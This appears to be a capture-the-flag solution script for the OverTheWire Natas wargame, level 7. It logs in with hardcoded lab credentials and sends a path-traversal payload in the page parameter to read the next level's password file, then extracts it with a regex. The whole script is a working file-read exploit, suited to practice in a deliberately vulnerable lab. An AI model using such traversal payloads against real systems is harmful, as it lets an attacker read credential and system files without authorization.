#!/usr/bin/env python

import requests 
import re

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

url = 'http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'

response = requests.post(url, auth = (username , password))
content = response.text



print(re.findall('<br>\n(.*)\n\n<!--',content)[0])